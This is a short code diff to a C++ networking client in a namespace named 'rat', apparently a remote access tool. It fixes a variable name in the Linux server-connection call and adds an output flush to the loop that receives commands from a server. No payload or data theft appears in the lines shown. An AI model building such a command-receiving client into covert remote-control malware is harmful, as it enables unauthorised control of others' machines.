@@ -35,7 +35,7 @@ long long rat::Client::ConnectToServer()
 	#ifdef _WIN32
 		InetPtonA(AF_INET, &server_ip_address_[0], &client_service.sin_addr.s_addr);
 	#elif __linux__
-		inet_pton(AF_INET, &server_addr[0], &client_service.sin_addr);
+		inet_pton(AF_INET, &server_ip_address_[0], &client_service.sin_addr);
 	#endif
 	//----------------------
 	// Connect to server.
@@ -119,6 +119,7 @@ void rat::Client::ReceiveCommand()
 				std::cout << "Invalid command from the server: " << std::endl;
 			}
 		}
+		std::cout << std::flush;
 	}
 	
 }
